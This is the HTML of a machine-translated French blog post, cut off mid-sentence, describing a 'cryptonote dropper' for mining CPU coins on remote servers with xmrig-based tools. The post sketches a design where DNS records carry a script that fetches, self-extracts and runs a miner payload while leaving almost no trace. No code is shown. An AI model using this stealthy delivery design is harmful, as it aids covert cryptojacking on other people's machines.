<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=fr><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/fr/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link href=https://www.unto.re/de/posts/chronichles_of_a_cryptonote_dropper hreflang=de rel=alternate><link href=https://www.unto.re/it/posts/chronichles_of_a_cryptonote_dropper hreflang=it rel=alternate><link href=https://www.unto.re/zh/posts/chronichles_of_a_cryptonote_dropper hreflang=zh rel=alternate><link href=https://www.unto.re/es/posts/chronichles_of_a_cryptonote_dropper hreflang=es rel=alternate><link href=https://www.unto.re/hi/posts/chronichles_of_a_cryptonote_dropper hreflang=hi rel=alternate><link href=https://www.unto.re/ar/posts/chronichles_of_a_cryptonote_dropper hreflang=ar rel=alternate><link href=https://www.unto.re/pt/posts/chronichles_of_a_cryptonote_dropper hreflang=pt rel=alternate><link href=https://www.unto.re/bn/posts/chronichles_of_a_cryptonote_dropper hreflang=bn rel=alternate><link href=https://www.unto.re/ru/posts/chronichles_of_a_cryptonote_dropper hreflang=ru rel=alternate><link href=https://www.unto.re/ja/posts/chronichles_of_a_cryptonote_dropper hreflang=ja rel=alternate><link href=https://www.unto.re/pa/posts/chronichles_of_a_cryptonote_dropper hreflang=pa rel=alternate><link href=https://www.unto.re/jw/posts/chronichles_of_a_cryptonote_dropper hreflang=jw rel=alternate><link href=https://www.unto.re/vi/posts/chronichles_of_a_cryptonote_dropper hreflang=vi rel=alternate><link href=https://www.unto.re/fr/posts/chronichles_of_a_cryptonote_dropper hreflang=fr rel=alternate><link href=https://www.unto.re/ur/posts/chronichles_of_a_cryptonote_dropper hreflang=ur rel=alternate><link href=https://www.unto.re/tr/posts/chronichles_of_a_cryptonote_dropper hreflang=tr rel=alternate><link href=https://www.unto.re/pl/posts/chronichles_of_a_cryptonote_dropper hreflang=pl rel=alternate><link href=https://www.unto.re/uk/posts/chronichles_of_a_cryptonote_dropper hreflang=uk rel=alternate><link href=https://www.unto.re/nl/posts/chronichles_of_a_cryptonote_dropper hreflang=nl rel=alternate><link href=https://www.unto.re/el/posts/chronichles_of_a_cryptonote_dropper hreflang=el rel=alternate><link href=https://www.unto.re/sv/posts/chronichles_of_a_cryptonote_dropper hreflang=sv rel=alternate><link href=https://www.unto.re/zu/posts/chronichles_of_a_cryptonote_dropper hreflang=zu rel=alternate><link href=https://www.unto.re/ro/posts/chronichles_of_a_cryptonote_dropper hreflang=ro rel=alternate><link href=https://www.unto.re/ms/posts/chronichles_of_a_cryptonote_dropper hreflang=ms rel=alternate><link href=https://www.unto.re/ko/posts/chronichles_of_a_cryptonote_dropper hreflang=ko rel=alternate><link href=https://www.unto.re/th/posts/chronichles_of_a_cryptonote_dropper hreflang=th rel=alternate><link href=https://www.unto.re/tl/posts/chronichles_of_a_cryptonote_dropper hreflang=tl rel=alternate><link title="le site d'untoreh"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/fr/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.webp property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=en_US property=og:locale><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2023,"@context":"https://schema.org/","image":"/assets/appa.webp","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2022-12-11","dateCreated":"December 11, 2022","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2022-12-11","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2022-12-11","inLanguage":"English","image":"/assets/appa.webp","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><style>:root{--block-background:var(--accent2);--small:14px;--normal:19px;--text-color:hsv(0, 0%, 20%)}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width:940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width:480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h2{font-size:22px}h2{text-align:left}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid #d3d3d3;margin-top:2em;margin-bottom:1em}.franklin-content h2 a{color:inherit}.franklin-content a{color:var(--alt2);text-decoration:none}body{counter-reset:eqnum}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}@media (prefers-color-scheme:light){body{--accent:#3152ff;--accent2:#5a61ae;--accent3:#651b00;--alt:#ae6600;--alt2:#9e6c47;--alt3:#7f4200;--background-color:#ffebee;--foreground-color:#1c0005;--block-background:#423833;--red:#e42a2f;--yellow:#917329;--green:#29892d}}@media (prefers-color-scheme:dark){body{--accent:#72e200;--accent2:#add3a0;--accent3:#7a9eff;--alt:#8abeff;--alt2:#836bd1;--alt3:#a090de;--background-color:#001d49;--foreground-color:#dae2ff;--block-background:#011627;--red:#e42a2f;--yellow:#917329;--green:#29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.franklin-content{color:var(--foreground-color)}.franklin-content .header-anchor{padding:.5rem!important;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}body>div>h1{text-align:center;color:var(--accent2)}body>div #page-description,body>div #title{text-align:center}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:700;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:700;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.author__avatar>img{width:4em;height:4em;border-radius:50%;-o-object-fit:cover;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .ham,#site-nav .vert{display:none}.author__avatar{-o-object-fit:contain;object-fit:contain;float:left}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}.author__wrap .author__avatar{float:left}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%!important}.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;padding-left:3rem}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content{padding-top:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:0;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:Courier New;font-weight:700;font-size:1.5rem}.lunrSearchForm .search-button{color:var(--alt);background:0 0;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1}@media (min-width:680px) and (max-width:1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham{outline:0}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:0 0;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0;overflow:hidden;filter:blur(1rem)}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;padding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width:680px){.lang-link{height:3rem}.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}.masthead,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}}.lunrSearchForm{margin-top:1em}@media (max-width:480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}.masthead{height:34rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width:480px) and (max-width:680px){.masthead{height:20rem}}@media (max-width:680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}}@-webkit-keyframes chars{0%,1.8105942029%{content:"u"}1.8115942029%,3.6221884058%{content:"un"}3.6231884058%,5.4337826087%{content:"unt"}5.4347826087%,7.2453768116%{content:"unto"}7.2463768116%,9.0569710145%{content:"untor"}10.8685652174%,9.0579710145%{content:"untore"}10.8695652174%,12.6801594203%{content:"untoreh"}12.6811594203%,14.4917536232%{content:"untoreh'"}14.4927536232%,16.3033478261%{content:"untoreh's"}16.3043478261%,18.114942029%{content:"untoreh's "}18.115942029%,19.9265362319%{content:"untoreh's s"}19.9275362319%,21.7381304348%{content:"untoreh's si"}21.7391304348%,23.5497246377%{content:"untoreh's sit"}23.5507246377%,to{content:"untoreh's site"}}@keyframes chars{0%,1.8105942029%{content:"u"}1.8115942029%,3.6221884058%{content:"un"}3.6231884058%,5.4337826087%{content:"unt"}5.4347826087%,7.2453768116%{content:"unto"}7.2463768116%,9.0569710145%{content:"untor"}10.8685652174%,9.0579710145%{content:"untore"}10.8695652174%,12.6801594203%{content:"untoreh"}12.6811594203%,14.4917536232%{content:"untoreh'"}14.4927536232%,16.3033478261%{content:"untoreh's"}16.3043478261%,18.114942029%{content:"untoreh's "}18.115942029%,19.9265362319%{content:"untoreh's s"}19.9275362319%,21.7381304348%{content:"untoreh's si"}21.7391304348%,23.5497246377%{content:"untoreh's sit"}23.5507246377%,to{content:"untoreh's site"}}@-webkit-keyframes cursor{75%{border-color:transparent}}@keyframes cursor{75%{border-color:transparent}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:VT323,monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:5.52s linear 1s forwards chars,1s 3 cursor;animation:5.52s linear 1s forwards chars,1s 3 cursor}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px}.hvr-outline-in{display:inline-block;vertical-align:middle;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transform-style:preserve-3d}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-es{background-position:-224px -33px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-za{background-position:-256px -154px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-pl{background-position:-176px -110px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-in{background-position:-64px -66px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-se{background-position:-208px -121px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-cn{background-position:-176px -22px}</style><link as=style href=/css/bundle.css rel=preload><link href=/css/bundle.css media=print onload=this.onload=null;this.removeAttribute('media'); rel=stylesheet><noscript><link href=/css/bundle.css rel=stylesheet></noscript><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Chroniques d'un compte-gouttes cryptonote</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/fr/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/fr/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2023-01-14T18:34:40.725","inLanguage":"fr","name":"","mainEntityOfPage":{"@id":"/fr/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/fr/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" untoreh-lumière"class=flip-front src=/assets/appa.webp><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Rechercher sur le site Web"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/fr/posts/><i class="fas fa-pen menu-icons"></i> des postes</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/fr/media/><i class="fas fa-tv menu-icons"></i> médias</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Rechercher sur le site Web"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/fr/posts/><i class="fas fa-pen menu-icons"></i> des postes</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/fr/media/><i class="fas fa-tv menu-icons"></i> médias</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/fr/posts/chronichles_of_a_cryptonote_dropper> Chroniques d'un compte-gouttes cryptonote</a></h1><blockquote id=page-description style=font-style:italic>... Jusqu'où êtes-vous prêt à aller pour... quelques centimes ?</blockquote></div><div class=franklin-content><p>Supposons que vous vouliez le mien<a href=https://en.wikipedia.org/wiki/Cryptocurrency> crypto-monnaies</a> à distance<em> virtuel</em> Matériel. Vous devez trouver quelque chose à moi. Les serveurs distants signifient, non<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> ou des algorithmes de preuve de travail GPU, essentiellement uniquement<a href=\posts/a-few-notes-on-proof-of-work> Pièces compatibles avec le processeur</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Les logiciels</a></h2><p>Cherchez et trouvez un<a href=https://github.com/xmrig/xmrig> mineur</a> , mais ce n'est pas vraiment sympa, vous aimeriez quelque chose que vous pouvez mieux contrôler à distance, alors vous trouvez<a href=https://github.com/Bendr0id/xmrigCC> un autre mineur</a> . Vous voulez aussi un<a href=https://github.com/Bendr0id/xmrigcc-proxy> Procuration</a> , car de nombreuses connexions seront de courte durée, vous ne voulez pas<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> votre pool minier. Aussi un<a href=https://github.com/search?q=tunnel> tunnel</a> serait sympa.<h2 id=the_design><a class=header-anchor href=#the_design> La conception</a></h2><p>Certains botnets utilisent les données des blockchains pour rechercher des commandes,<a href=https://twitter.com/sarahjamielewis> quelqu'un</a> semble également avoir<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> paris perdus</a> que cela ne se reproduise plus ... de toute façon, nous ne sommes pas si sophistiqués, nous nous débrouillerons avec des enregistrements DNS qui stockent un script qui extrait la charge utile que l'auto-extraction dans un répertoire temporaire s'exécute et quitte<em> presque</em> aucune trace de son installation. Voici un petit organigramme qui décrit la structure</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher> Lanceur</a></h2><p>L'intérêt d'un script de démarrage est d'être accessible et facilement modifiable afin qu'il 